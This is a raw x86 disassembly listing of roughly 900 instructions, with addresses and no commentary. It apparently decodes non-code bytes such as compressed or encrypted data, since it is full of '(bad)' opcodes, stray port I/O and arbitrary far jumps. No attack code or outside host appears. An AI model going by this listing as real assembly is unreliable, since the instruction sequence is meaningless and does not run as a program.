  414dc2:	lods   al,BYTE PTR ds:[esi]
  414dc3:	mov    BYTE PTR [ebx-0x2ca69933],al
  414dc9:	jae    0x414db5
  414dcb:	(bad)  
  414dcc:	neg    DWORD PTR [edi+0x419c5ff2]
  414dd2:	push   cs
  414dd3:	or     DWORD PTR [eax-0x5c],ebp
  414dd6:	cmp    DWORD PTR [ebx],edi
  414dd8:	mov    esi,DWORD PTR [edi]
  414dda:	jle    0x414e0b
  414ddc:	or     dl,dl
  414dde:	sbb    bh,BYTE PTR [edi-0x44240569]
  414de4:	je     0x414d9c
  414de6:	or     DWORD PTR [edi-0x3c5f13d4],edx
  414dec:	inc    edi
  414ded:	jne    0x414e48
  414def:	sar    BYTE PTR [ecx-0x79],1
  414df2:	cmp    al,0x7c
  414df4:	sub    eax,0x761bc5e
  414df9:	leave  
  414dfa:	js     0x414dc0
  414dfc:	ja     0x414e52
  414dfe:	aaa    
  414dff:	dec    edx
  414e00:	xor    al,BYTE PTR [eax+0x6423d6a]
  414e06:	fucomi st,st(2)
  414e08:	mov    WORD PTR [ecx+0x4b6e2f21],cs
  414e0e:	and    BYTE PTR [eax],bh
  414e10:	aas    
  414e11:	adc    BYTE PTR [ecx],bl
  414e13:	xchg   edi,eax
  414e14:	fld    QWORD PTR [ebp+0x9dfe616]
  414e1a:	sbb    ebp,DWORD PTR [ebp-0x43]
  414e1d:	shr    BYTE PTR [ecx],0x1e
  414e20:	sbb    dh,cl
  414e22:	cmp    esi,ebx
  414e24:	fistp  DWORD PTR [eax]
  414e26:	and    al,0x5
  414e28:	xchg   ebp,eax
  414e29:	(bad)  
  414e2a:	nop
  414e2b:	pop    ecx
  414e2c:	sahf   
  414e2d:	mov    ah,0x41
  414e2f:	cmp    edi,ebx
  414e31:	loop   0x414de6
  414e33:	inc    esp
  414e34:	cli    
  414e35:	xlat   BYTE PTR ds:[ebx]
  414e36:	inc    esi
  414e37:	js     0x414e6a
  414e39:	adc    dh,BYTE PTR ds:[edi-0x6]
  414e3d:	(bad)  
  414e3f:	lock inc esp
  414e41:	(bad)  
  414e42:	cs mov ah,0x2b
  414e45:	mov    eax,fs
  414e47:	rol    BYTE PTR [ebp-0x4d],1
  414e4a:	add    ah,0x6d
  414e4d:	dec    esp
  414e4e:	jmp    DWORD PTR [ecx]
  414e50:	mov    eax,ds:0xd5229ba5
  414e55:	sub    al,0x82
  414e57:	int    0x15
  414e59:	loopne 0x414e44
  414e5b:	jae    0x414e46
  414e5d:	jb     0x414eb2
  414e5f:	or     al,0xa3
  414e61:	call   0x6c3c1bc8
  414e66:	inc    esp
  414e67:	(bad)  
  414e68:	xor    BYTE PTR [edx+0xe],cl
  414e6b:	ja     0x414e2a
  414e6d:	push   edx
  414e6e:	loopne 0x414e65
  414e70:	add    al,0x5c
  414e72:	fstp   TBYTE PTR ds:0x5a8b54e8
  414e78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e79:	mov    al,BYTE PTR [edi-0xc]
  414e7c:	loop   0x414e27
  414e7e:	jmp    0x414ecb
  414e80:	push   ecx
  414e81:	push   cs
  414e82:	out    0x1f,eax
  414e84:	xlat   BYTE PTR ds:[ebx]
  414e85:	sar    DWORD PTR [ebx+0xf63fc1],1
  414e8b:	jl     0x414e4b
  414e8d:	repnz aas 
  414e8f:	inc    ebp
  414e90:	pusha  
  414e91:	mov    al,ds:0x636e9f79
  414e96:	aad    0x9e
  414e98:	(bad)  
  414e99:	in     eax,dx
  414e9a:	out    dx,al
  414e9b:	loope  0x414eba
  414e9d:	retf   
  414e9e:	jo     0x414ec7
  414ea0:	mov    ecx,DWORD PTR [edx]
  414ea2:	sbb    eax,0xdde01af4
  414ea7:	jmp    0x14ba:0x6297075c
  414eae:	push   ebp
  414eaf:	cmp    eax,0xb120254c
  414eb4:	cmp    BYTE PTR [edi],dh
  414eb6:	sbb    BYTE PTR [ebp+0x19],ah
  414eb9:	xchg   ebx,eax
  414eba:	rcr    BYTE PTR [edx-0xa],0x65
  414ebe:	mov    cs,WORD PTR [eax]
  414ec0:	push   eax
  414ec1:	and    DWORD PTR [ebp-0x566451a3],ebp
  414ec7:	in     eax,0x48
  414ec9:	daa    
  414eca:	adc    eax,0x920d17cd
  414ecf:	ds pop ss
  414ed1:	sbb    al,0x65
  414ed3:	je     0x414ef0
  414ed5:	inc    edi
  414ed6:	ja     0x414f20
  414ed8:	pop    ebp
  414ed9:	fcmovnu st,st(1)
  414edb:	or     al,0x32
  414edd:	mov    ds,WORD PTR [eax+0x44]
  414ee0:	sub    edx,edi
  414ee2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ee3:	fwait
  414ee4:	aam    0xc2
  414ee6:	sub    eax,0xecbc2a99
  414eeb:	push   0x9e4172e2
  414ef0:	adc    BYTE PTR [edx-0x2b],al
  414ef3:	cmp    dl,BYTE PTR [ecx-0x310fd169]
  414ef9:	pop    DWORD PTR [ebp-0x6e27dbea]
  414eff:	test   DWORD PTR [edi],esp
  414f01:	sub    ebx,esp
  414f03:	fsub   QWORD PTR [edx-0x7b2da582]
  414f09:	std    
  414f0a:	loopne 0x414f78
  414f0c:	aam    0x0
  414f0e:	sbb    DWORD PTR [eax+0x6ccf96eb],ebp
  414f14:	test   eax,0xadd9156b
  414f19:	mov    DWORD PTR [ebx-0x3cd3e652],eax
  414f1f:	sub    eax,DWORD PTR [edx+ecx*2]
  414f22:	jo     0x414f38
  414f24:	js     0x414ee6
  414f26:	mov    ds:0x808f0c5a,eax
  414f2b:	test   DWORD PTR [ebp+edi*8+0x3938e1d4],edi
  414f32:	(bad)  
  414f33:	out    0xe4,al
  414f35:	ins    BYTE PTR es:[edi],dx
  414f36:	or     dh,dl
  414f38:	test   BYTE PTR ds:0xc01a19c0,0x42
  414f3f:	dec    edi
  414f40:	cli    
  414f41:	mov    esp,eax
  414f43:	sbb    DWORD PTR [edi-0x605fdc5b],ecx
  414f49:	xchg   ebp,eax
  414f4a:	lahf   
  414f4b:	enter  0x7f83,0xac
  414f4f:	inc    edi
  414f50:	cmc    
  414f51:	pop    ss
  414f52:	sbb    ah,BYTE PTR [edi]
  414f54:	xor    BYTE PTR [edx+0x703afb78],0x76
  414f5b:	sar    BYTE PTR [eax],cl
  414f5d:	dec    edx
  414f5e:	cwde   
  414f5f:	pusha  
  414f60:	out    0x3c,al
  414f62:	mov    ds,esi
  414f64:	es jae 0x414f4c
  414f67:	jnp    0x414f9f
  414f69:	mov    dl,0x85
  414f6b:	adc    edi,DWORD PTR [edx]
  414f6d:	mov    esp,0xc6550f96
  414f72:	add    BYTE PTR [ebx+0x5a490581],dh
  414f78:	lods   al,BYTE PTR ds:[esi]
  414f79:	inc    ebp
  414f7a:	sub    ebp,ebx
  414f7c:	cdq    
  414f7d:	rcr    DWORD PTR [eax-0x41],1
  414f80:	mov    eax,DWORD PTR [edx+edx*8]
  414f83:	(bad)  
  414f84:	lea    esi,[ebp+0x2dc43ddb]
  414f8a:	mov    esp,0x179257d1
  414f8f:	and    ebp,ebp
  414f91:	adc    eax,DWORD PTR [eax]
  414f93:	ins    DWORD PTR es:[edi],dx
  414f94:	leave  
  414f95:	cmp    esi,0x4
  414f98:	cmove  edi,DWORD PTR [eax+0x68]
  414f9c:	xchg   ebp,eax
  414f9d:	xchg   edx,eax
  414f9e:	sub    BYTE PTR [ecx-0x8],al
  414fa1:	mov    DWORD PTR [eax+ecx*1+0x7144dd31],edx
  414fa8:	imul   ecx,DWORD PTR [eax-0x44ec029e],0xffffffa5
  414faf:	loop   0x415028
  414fb1:	lods   eax,DWORD PTR ds:[esi]
  414fb2:	test   BYTE PTR [edi-0x14],0x6d
  414fb6:	aas    
  414fb7:	xor    al,0x52
  414fb9:	jmp    0xb50bf6fa
  414fbe:	cmp    edx,DWORD PTR ds:0xdf60debb
  414fc4:	ja     0x414f53
  414fc6:	jecxz  0x414fa5
  414fc8:	es add al,0x9a
  414fcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fcc:	test   DWORD PTR [eax],esi
  414fce:	jle    0x414f88
  414fd0:	mov    bl,0x9b
  414fd2:	jg     0x415025
  414fd4:	pop    ebp
  414fd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fd6:	out    0xd2,eax
  414fd8:	pop    edx
  414fd9:	jcxz   0x414fe7
  414fdc:	lds    ebx,FWORD PTR [esp+ebp*1-0x2e4795f0]
  414fe3:	jle    0x414f8f
  414fe5:	add    eax,0xcae6d95f
  414fea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414feb:	(bad)  
  414fec:	sub    al,0x3d
  414fee:	outs   dx,DWORD PTR ds:[esi]
  414fef:	je     0x41502e
  414ff1:	fdiv   st(1),st
  414ff3:	jb     0x414f95
  414ff5:	push   cs
  414ff6:	enter  0x4e9b,0xe2
  414ffa:	mov    ecx,0x9a743774
  414fff:	sbb    ebx,esi
  415001:	jp     0x41506c
  415003:	dec    esi
  415004:	sahf   
  415005:	inc    ebp
  415006:	nop
  415007:	repnz mov dl,0x6a
  41500a:	push   ds
  41500b:	addr16 xchg ebp,eax
  41500d:	(bad)  
  41500e:	push   eax
  41500f:	in     eax,dx
  415010:	rcr    BYTE PTR [ecx-0x57],cl
  415013:	sti    
  415014:	mov    edx,DWORD PTR [ebx]
  415016:	jbe    0x41501e
  415018:	aam    0x34
  41501a:	nop
  41501b:	fwait
  41501c:	mov    ?,WORD PTR [ebx+0x3375d527]
  415022:	push   es
  415023:	mov    ds:0xa66a89b,al
  415028:	(bad)  
  415029:	dec    esi
  41502a:	sti    
  41502b:	ret    0x6b6a
  41502e:	daa    
  41502f:	mov    ecx,DWORD PTR [eax+edi*8-0x48]
  415033:	xchg   ebp,eax
  415034:	jg     0x41508a
  415036:	push   eax
  415037:	xchg   ebx,eax
  415038:	lods   eax,DWORD PTR ds:[esi]
  415039:	jno    0x415049
  41503b:	xchg   BYTE PTR [ebp+0xb],cl
  41503e:	fstp   TBYTE PTR [eax-0x38cc1fcc]
  415044:	xchg   ecx,eax
  415045:	pop    edx
  415046:	cmp    eax,0xbfab65b5
  41504b:	jg     0x415039
  41504d:	arpl   WORD PTR [edi],si
  41504f:	or     esi,DWORD PTR [ebp+0x435a4d8f]
  415055:	xchg   esi,eax
  415056:	push   esi
  415057:	into   
  415058:	arpl   WORD PTR [ebx],cx
  41505a:	call   0x4bc9ebf3
  41505f:	push   ss
  415060:	rol    BYTE PTR [ecx-0x5b],1
  415063:	dec    ebx
  415064:	or     al,0xef
  415066:	mov    WORD PTR [edi-0x672b6638],ss
  41506c:	mov    cl,0xb1
  41506e:	out    dx,eax
  41506f:	jg     0x415037
  415071:	je     0x414ff6
  415073:	mov    DWORD PTR [ecx-0x3655547b],edi
  415079:	and    al,0x61
  41507b:	lahf   
  41507c:	push   cs
  41507d:	ins    BYTE PTR es:[edi],dx
  41507e:	xor    BYTE PTR [eax+0xa],ah
  415081:	jo     0x41509a
  415083:	and    ecx,DWORD PTR [ebp*1+0x66233f78]
  41508a:	pop    edx
  41508b:	fist   WORD PTR [ebx]
  41508d:	scas   eax,DWORD PTR es:[edi]
  41508e:	out    0xfc,al
  415090:	jmp    0x276e2af1
  415095:	fbstp  TBYTE PTR [ecx-0x10]
  415098:	sub    BYTE PTR fs:[edi+eiz*4+0x4b],bl
  41509d:	and    BYTE PTR [edx+edi*2-0x63],0xde
  4150a2:	dec    ecx
  4150a3:	ja     0x41510a
  4150a5:	sar    DWORD PTR [eax-0x713ce308],0x49
  4150ac:	outs   dx,DWORD PTR ds:[esi]
  4150ad:	les    eax,FWORD PTR [edx+esi*2]
  4150b0:	retf   
  4150b1:	add    eax,0xc591a37e
  4150b6:	cmp    al,0xc3
  4150b8:	(bad)  
  4150b9:	cld    
  4150ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150bb:	gs icebp 
  4150bd:	adc    al,0xfc
  4150bf:	dec    edi
  4150c0:	pop    es
  4150c1:	loope  0x4150cc
  4150c3:	xchg   ebp,eax
  4150c4:	mov    esi,0x39cad5d5
  4150c9:	cmc    
  4150ca:	pushf  
  4150cb:	mov    ah,0x28
  4150cd:	jecxz  0x415097
  4150cf:	mov    ebp,0x14e92a15
  4150d4:	stos   BYTE PTR es:[edi],al
  4150d5:	mov    ebx,0xb536a7c8
  4150da:	call   0xee9cc8b6
  4150df:	aas    
  4150e0:	idiv   bl
  4150e2:	outs   dx,BYTE PTR ds:[esi]
  4150e3:	sbb    al,0xd2
  4150e5:	(bad)  
  4150e6:	adc    dh,BYTE PTR [ecx]
  4150e8:	push   0xffffff85
  4150ea:	lods   eax,DWORD PTR ds:[esi]
  4150eb:	stos   BYTE PTR es:[edi],al
  4150ec:	and    DWORD PTR [edx-0x60],esi
  4150ef:	pop    ebx
  4150f0:	adc    dh,BYTE PTR [edi]
  4150f2:	out    dx,eax
  4150f3:	imul   BYTE PTR [ebx-0x512d4488]
  4150f9:	lods   eax,DWORD PTR ds:[esi]
  4150fa:	mov    eax,ds:0x74013b69
  4150ff:	lahf   
  415100:	sbb    DWORD PTR [edi],ecx
  415102:	ret    0x42cc
  415105:	sti    
  415106:	or     esi,ebp
  415108:	shl    DWORD PTR [esi],cl
  41510a:	fcom   DWORD PTR [ecx-0x67]
  41510d:	(bad)  
  41510e:	mov    ch,0x32
  415110:	outs   dx,DWORD PTR ds:[esi]
  415111:	jne    0x4150c8
  415113:	enter  0xf3f8,0x6f
  415117:	jge    0x415158
  415119:	cmp    ah,BYTE PTR [eax]
  41511b:	fwait
  41511c:	popa   
  41511d:	retf   0x5866
  415120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415121:	icebp  
  415122:	dec    ebx
  415123:	dec    BYTE PTR [edx+0x67]
  415126:	pop    esp
  415127:	repnz mov dh,0x47
  41512a:	push   ecx
  41512b:	je     0x4150e9
  41512d:	push   eax
  41512e:	es ds adc al,0x4f
  415132:	sbb    BYTE PTR [edi+0x21],0xe1
  415136:	inc    eax
  415137:	mov    dh,0xab
  415139:	push   eax
  41513a:	sub    eax,0xbc66a738
  41513f:	loopne 0x415120
  415141:	int    0xe4
  415143:	or     DWORD PTR [ecx-0x149e22bd],ebp
  415149:	or     BYTE PTR [ebx+0x53],0xa0
  41514d:	xlat   BYTE PTR ds:[ebx]
  41514e:	inc    ebp
  41514f:	(bad)  
  415150:	cmp    DWORD PTR [esi-0x3e],0xfffffff9
  415154:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415155:	test   al,0x14
  415157:	or     eax,0x641897d9
  41515c:	push   0x3407fefa
  415161:	mov    dh,0xba
  415163:	stc    
  415164:	sti    
  415165:	dec    ebx
  415166:	pop    eax
  415167:	int3   
  415168:	iret   
  415169:	test   eax,0xa11aae92
  41516e:	ss pop es
  415170:	push   ds
  415171:	sbb    DWORD PTR [ebp+0x2a],esi
  415174:	les    esi,FWORD PTR [ebx*2-0x1a3ae9ec]
  41517b:	mov    ah,0x7e
  41517d:	mov    ch,0x2c
  41517f:	adc    eax,0xc4b05bea
  415184:	cli    
  415185:	test   BYTE PTR [edi+0x16],bl
  415188:	inc    esi
  415189:	inc    ebx
  41518a:	retf   0x1ef9
  41518d:	mov    ch,0xf1
  41518f:	nop
  415190:	outs   dx,DWORD PTR ds:[esi]
  415191:	jo     0x415198
  415193:	and    DWORD PTR [ecx+0x7aca6f82],edi
  415199:	push   ss
  41519a:	push   esp
  41519b:	cli    
  41519c:	imul   ecx,esp,0xffffffd8
  41519f:	add    dl,dl
  4151a1:	js     0x4151a4
  4151a3:	jmp    0xc6b6:0xfbb3cb85
  4151aa:	mov    esp,DWORD PTR [esi]
  4151ac:	sbb    eax,0x825baa41
  4151b1:	cdq    
  4151b2:	aaa    
  4151b3:	adc    BYTE PTR [edx],0xb7
  4151b6:	bnd jb 0x415184
  4151b9:	fwait
  4151ba:	int    0x29
  4151bc:	pop    ebx
  4151bd:	push   ecx
  4151be:	(bad)  
  4151bf:	jae    0x4151bd
  4151c1:	or     BYTE PTR ds:0xf98ba17b,bh
  4151c7:	test   BYTE PTR [esi-0xd],dh
  4151ca:	inc    eax
  4151cb:	or     DWORD PTR [edx+0x9e1d91e],0x9901f8ed
  4151d5:	inc    edx
  4151d6:	ror    BYTE PTR [ecx+0x3f],1
  4151d9:	ficom  DWORD PTR [ecx-0x1ed8ff75]
  4151df:	mov    esi,0x9d3830e6
  4151e4:	mov    eax,ds:0x17fe37f9
  4151e9:	rcr    BYTE PTR [eax],1
  4151eb:	mov    eax,0x6e592e09
  4151f0:	and    eax,0x781db68a
  4151f5:	ins    BYTE PTR es:[edi],dx
  4151f6:	cdq    
  4151f7:	sti    
  4151f8:	cs mov ecx,0x2985c673
  4151fe:	cwde   
  4151ff:	xchg   esi,eax
  415200:	ror    DWORD PTR [ecx-0x760313ab],1
  415206:	data16 mov bh,0x27
  415209:	fs xor al,0xa7
  41520c:	jo     0x4151fc
  41520e:	and    eax,0x3b462304
  415213:	xlat   BYTE PTR ds:[ebx]
  415214:	jle    0x4151dd
  415216:	inc    esi
  415217:	int3   
  415218:	pushf  
  415219:	enter  0x1b17,0x87
  41521d:	mov    ebx,0xc213c157
  415222:	aad    0xb0
  415224:	fiadd  DWORD PTR [edx]
  415226:	ins    BYTE PTR es:[edi],dx
  415227:	dec    eax
  415228:	mov    ebp,0x37faeabb
  41522d:	ficomp DWORD PTR [ecx+esi*2]
  415230:	push   ss
  415231:	xchg   ecx,eax
  415232:	hlt    
  415233:	xor    bh,BYTE PTR [esi-0x44]
  415236:	mov    BYTE PTR [edx-0x5d35a045],bh
  41523c:	mov    eax,ds:0x675196e0
  415241:	inc    ecx
  415242:	lahf   
  415243:	shl    BYTE PTR [ecx-0x3db01f4d],0x26
  41524a:	(bad)  
  41524b:	je     0x41529c
  41524d:	ds sub eax,0xa9bb9dcb
  415253:	xchg   esi,eax
  415254:	shr    DWORD PTR [ebx],0x33
  415257:	dec    edi
  415258:	pop    es
  415259:	pop    esp
  41525a:	sbb    DWORD PTR [eax],ecx
  41525c:	push   ebp
  41525d:	pop    eax
  41525e:	loope  0x41529b
  415260:	imul   ebp,DWORD PTR ds:0xb5fcd0a6,0x30
  415267:	ins    BYTE PTR es:[edi],dx
  415268:	shr    DWORD PTR [edi+0xd263faa],1
  41526e:	imul   ebx,DWORD PTR [ecx+0x6e],0x53
  415272:	fs shl DWORD PTR es:[ecx],cl
  415276:	test   ecx,esp
  415278:	js     0x4152c2
  41527a:	aam    0x93
  41527c:	nop
  41527d:	loope  0x4152e1
  41527f:	xchg   al,al
  415281:	and    eax,0x1968fe17
  415286:	pop    esp
  415287:	std    
  415288:	push   eax
  415289:	ja     0x415290
  41528b:	pop    ds
  41528c:	pop    esp
  41528d:	jb     0x41526a
  41528f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415290:	sbb    DWORD PTR [ebp+0x50b14aac],eax
  415296:	jns    0x415233
  415298:	lock nop
  41529a:	or     al,0x42
  41529c:	in     al,0x8b
  41529e:	(bad)  
  41529f:	pop    edx
  4152a0:	lods   eax,DWORD PTR ds:[esi]
  4152a1:	std    
  4152a2:	mov    esp,0xb9592dbf
  4152a7:	inc    edi
  4152a8:	dec    esi
  4152a9:	hlt    
  4152aa:	mov    dl,0x5a
  4152ac:	mov    dl,0x17
  4152ae:	ds jl  0x415240
  4152b1:	sbb    eax,0x21340fc7
  4152b6:	ret    
  4152b7:	add    eax,0x3b8b9335
  4152bc:	in     al,dx
  4152bd:	cmp    al,0x5d
  4152bf:	add    eax,0x7492f633
  4152c4:	je     0x4152c1
  4152c6:	jno    0x4152cc
  4152c8:	loope  0x41525d
  4152ca:	arpl   WORD PTR [edx-0x6a],di
  4152cd:	cli    
  4152ce:	cli    
  4152cf:	adc    BYTE PTR ds:0xb6c51e49,dl
  4152d5:	xadd   dh,dl
  4152d8:	fs xchg esp,eax
  4152da:	or     BYTE PTR [ecx+0x9572c84],cl
  4152e0:	cmp    al,0xa8
  4152e2:	aas    
  4152e3:	fcmove st,st(4)
  4152e5:	mov    dl,0x19
  4152e7:	cmp    al,0x14
  4152e9:	mov    edi,0xcfddcf56
  4152ee:	pop    edi
  4152ef:	mov    bh,BYTE PTR ds:0x6759e621
  4152f5:	stos   BYTE PTR es:[edi],al
  4152f6:	mov    eax,0xcd45e6aa
  4152fb:	pop    eax
  4152fc:	xchg   ebx,eax
  4152fd:	mov    WORD PTR [ebx+edx*2+0x48d40ba8],ss
  415304:	addr16 loop 0x4152f9
  415307:	iret   
  415308:	shr    DWORD PTR [ebp+0x4227102f],0x60
  41530f:	add    BYTE PTR [ecx],bh
  415311:	std    
  415312:	push   eax
  415313:	adc    DWORD PTR [edx+ebx*1+0x7f],edi
  415317:	call   0x6a15:0x78a0bbce
  41531e:	pop    edx
  41531f:	je     0x4152bb
  415321:	aas    
  415322:	lea    edi,[ebx-0x7c]
  415325:	das    
  415326:	pop    es
  415327:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415328:	push   edx
  415329:	(bad)  
  41532a:	cmp    edx,esp
  41532c:	test   ah,ch
  41532e:	test   al,0x44
  415330:	or     BYTE PTR [edi-0x76],ch
  415333:	xor    ah,bh
  415335:	fsubr  DWORD PTR [edi]
  415337:	pop    ss
  415338:	xor    BYTE PTR [esi-0x1cbb4953],ah
  41533e:	and    DWORD PTR [esi-0x18],ecx
  415341:	push   eax
  415342:	ss cmc 
  415344:	and    ch,BYTE PTR [ebp+0x5f86c737]
  41534a:	sbb    bh,ch
  41534c:	mov    ds:0xd3ddafb8,eax
  415351:	pop    esi
  415352:	sahf   
  415353:	sub    DWORD PTR [edx+0x15],0x65db45d2
  41535a:	xchg   ebp,eax
  41535b:	jbe    0x41532e
  41535d:	dec    ecx
  41535e:	das    
  41535f:	lods   eax,DWORD PTR ds:[esi]
  415360:	fcmovnbe st,st(5)
  415362:	pop    ebx
  415363:	pusha  
  415364:	scas   al,BYTE PTR es:[edi]
  415365:	std    
  415366:	sbb    DWORD PTR [ebp+eax*2+0x7ab5fcbb],edi
  41536d:	mov    BYTE PTR [edx],ah
  41536f:	pop    edi
  415370:	mov    bl,0xaf
  415372:	jae    0x41537a
  415374:	jae    0x4153e6
  415376:	clc    
  415377:	repnz xor cl,BYTE PTR [ecx]
  41537a:	aaa    
  41537b:	outs   dx,BYTE PTR ds:[esi]
  41537c:	dec    edi
  41537d:	div    dl
  41537f:	add    ebx,ebp
  415381:	cld    
  415382:	push   ecx
  415383:	pop    edi
  415384:	call   0xcdca:0x8d9e9372
  41538b:	push   ss
  41538c:	repnz sub al,0x0
  41538f:	xchg   esi,eax
  415390:	jae    0x415359
  415392:	cs pop ebx
  415394:	daa    
  415395:	sahf   
  415396:	dec    ebx
  415397:	jecxz  0x415358
  415399:	inc    edx
  41539a:	xchg   esp,eax
  41539b:	and    ch,BYTE PTR [eax-0x59]
  41539e:	icebp  
  41539f:	repz and ecx,DWORD PTR [edx+edx*1-0x67]
  4153a4:	xchg   edx,eax
  4153a5:	aaa    
  4153a6:	int    0xbf
  4153a8:	mov    ds:0xd2ca5a28,eax
  4153ad:	sahf   
  4153ae:	jno    0x415398
  4153b0:	add    esi,DWORD PTR [esi]
  4153b2:	(bad)  
  4153b3:	inc    DWORD PTR [ebp+0x2c]
  4153b6:	mov    al,ds:0xb61a9279
  4153bb:	out    0x64,eax
  4153bd:	lods   al,BYTE PTR ds:[esi]
  4153be:	je     0x415342
  4153c0:	repz scas eax,DWORD PTR es:[edi]
  4153c2:	out    0x27,eax
  4153c4:	popf   
  4153c5:	fimul  WORD PTR [ebx+0x44]
  4153c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153c9:	sbb    edi,DWORD PTR [esi-0x4eeb0ab9]
  4153cf:	and    dl,BYTE PTR [edi+0x364d7a9e]
  4153d5:	cli    
  4153d6:	inc    esp
  4153d7:	retf   0x6e2
  4153da:	(bad)  
  4153db:	and    ebx,eax
  4153dd:	leave  
  4153de:	les    edi,FWORD PTR [ecx+ecx*8-0x5584ad5c]
  4153e5:	frstor [eax-0x106ee62e]
  4153eb:	jno    0x4153a1
  4153ed:	push   esi
  4153ee:	jge    0x4153bd
  4153f0:	mov    bl,0x7b
  4153f2:	push   ebx
  4153f3:	jnp    0x41546e
  4153f5:	sbb    al,0x1e
  4153f7:	mov    bh,BYTE PTR [eax-0x7f]
  4153fa:	and    eax,0xf537d523
  4153ff:	xchg   edx,eax
  415400:	jb     0x415446
  415402:	dec    ecx
  415403:	ss retf 0x4950
  415407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415408:	dec    edi
  415409:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41540a:	jle    0x41540b
  41540c:	dec    eax
  41540d:	inc    ecx
  41540e:	das    
  41540f:	in     al,dx
  415410:	sbb    cl,dl
  415412:	cmp    DWORD PTR [edi],ecx
  415414:	loopne 0x415414
  415416:	cmp    eax,0xb9c59bbb
  41541b:	or     DWORD PTR [esi+0x23],eax
  41541e:	fild   DWORD PTR [ebp+0x6]
  415421:	cwde   
  415422:	jmp    0xbd6ff23f
  415427:	sub    al,0xe8
  415429:	test   bl,bl
  41542b:	xchg   edi,eax
  41542c:	push   ss
  41542d:	(bad)  
  41542f:	bound  edx,QWORD PTR [edi+0x9]
  415432:	aaa    
  415433:	mov    cl,0x9
  415435:	shr    DWORD PTR [ecx-0x58],1
  415438:	mov    eax,0xbe736d09
  41543d:	rcr    DWORD PTR [edx-0x23fb8b39],1
  415443:	inc    ebp
  415444:	dec    edx
  415445:	(bad)  
  415446:	sbb    ecx,esi
  415448:	sbb    ch,BYTE PTR [edx+0x29]
  41544b:	out    0xa5,al
  41544d:	(bad)  
  41544e:	repz push 0x15
  415451:	loopne 0x415431
  415453:	dec    eax
  415454:	or     edx,eax
  415456:	sbb    DWORD PTR [ecx+0x77],esi
  415459:	and    esp,edx
  41545b:	ins    BYTE PTR es:[edi],dx
  41545c:	push   0x4f
  41545e:	inc    ebx
  41545f:	xor    DWORD PTR [ebp-0x4c77f07],ebx
  415465:	fs aas 
  415467:	les    esp,FWORD PTR [eax]
  415469:	add    eax,0x70f33be5
  41546e:	loop   0x415448
  415470:	push   cs
  415471:	test   al,0x17
  415473:	mov    ecx,0xee9097cf
  415478:	add    dl,BYTE PTR ds:0xcf7de42f
  41547e:	add    DWORD PTR [esi],esi
  415480:	pop    esp
  415481:	inc    ebp
  415482:	cmp    ebx,DWORD PTR [edx+0x19]
  415485:	push   es
  415486:	stos   BYTE PTR es:[edi],al
  415487:	push   0x6ea17d30
  41548c:	sbb    DWORD PTR [ecx+0x5b51172a],0xffffffe5
  415493:	sbb    DWORD PTR [ecx-0x51],esp
  415496:	imul   BYTE PTR [ebx-0x26]
  415499:	add    al,0xb9
  41549b:	leave  
  41549c:	nop
  41549d:	xor    edi,ecx
  41549f:	dec    edx
  4154a0:	sbb    eax,0x9004d89c
  4154a5:	retf   0xc5c8
  4154a8:	sub    eax,0x825292f5
  4154ad:	xor    ah,BYTE PTR [ebp+edi*1+0x7b408eb0]
  4154b4:	xchg   esp,eax
  4154b5:	xor    eax,0xbbddffa
  4154ba:	out    dx,al
  4154bb:	dec    edx
  4154bc:	xchg   esi,eax
  4154bd:	pop    esp
  4154be:	imul   esi,ebp,0x62
  4154c1:	bound  eax,QWORD PTR [ebp-0x65433730]
  4154c7:	addr16 lahf 
  4154c9:	mov    esi,esp
  4154cb:	sahf   
  4154cc:	clc    
  4154cd:	in     eax,dx
  4154ce:	inc    esi
  4154cf:	lea    esp,[eiz*2-0x4d9d2223]
  4154d6:	pushf  
  4154d7:	fwait
  4154d8:	pop    es
  4154d9:	test   eax,0x979f6aed
  4154de:	jge    0x4154c1
  4154e0:	or     eax,0xab5ceb93
  4154e5:	mov    al,ds:0xb399a458
  4154ea:	(bad)  
  4154eb:	popf   
  4154ec:	iret   
  4154ed:	rcl    DWORD PTR [ecx],1
  4154ef:	and    ebp,eax
  4154f1:	out    dx,al
  4154f2:	dec    esi
  4154f3:	or     ah,0x63
  4154f6:	out    0xb6,eax
  4154f8:	stos   BYTE PTR es:[edi],al
  4154f9:	jle    0x41551c
  4154fb:	cmp    al,0x4c
  4154fd:	xor    eax,0x558e9133
  415502:	jg     0x4154ca
  415504:	into   
  415505:	add    eax,0x72f67811
  41550a:	xchg   esp,eax
  41550b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41550c:	xchg   esp,eax
  41550d:	inc    edi
  41550e:	mov    bh,0x6e
  415510:	(bad)  
  415512:	inc    ebp
  415513:	arpl   dx,di
  415515:	mov    dh,0xbd
  415517:	or     DWORD PTR [eax-0x78],eax
  41551a:	das    
  41551b:	or     edx,DWORD PTR [edx+0x41]
  41551e:	out    0x12,eax
  415520:	daa    
  415521:	jmp    0xdf98:0x3bf3c24f
  415528:	dec    edi
  415529:	sahf   
  41552a:	cmc    
  41552b:	xor    DWORD PTR [edi+0x6a83eb6d],esi
  415531:	jmp    0x55e8:0x205f425f
  415538:	xchg   DWORD PTR [bp+di+0x22e],ebp
  41553d:	lods   eax,DWORD PTR ds:[esi]
  41553e:	sbb    BYTE PTR [edi+0x5e],ah
  415541:	repnz adc dl,BYTE PTR [ebp-0x4b]
  415545:	jo     0x4154e0
  415547:	push   es
  415548:	lods   al,BYTE PTR ds:[esi]
  415549:	inc    ebp
  41554a:	xor    al,0xbb
  41554c:	test   BYTE PTR [ebx-0xd88f3fa],al
  415552:	into   
  415553:	imul   ecx,DWORD PTR [edx+0x86baeda],0x57
  41555a:	in     al,0x6f
  41555c:	repz mov ecx,0x7a9b8f7b
  415562:	pusha  
  415563:	mov    dh,bh
